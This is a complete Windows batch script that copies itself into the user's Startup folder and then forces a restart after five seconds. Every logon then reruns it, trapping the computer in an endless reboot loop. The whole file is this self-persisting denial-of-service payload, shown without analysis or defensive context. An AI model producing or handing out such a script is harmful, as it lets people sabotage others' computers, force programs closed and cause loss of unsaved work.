@echo off
setlocal
cls

copy /y "%~dp0restartComputer.bat" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"

shutdown -r -t 5 -f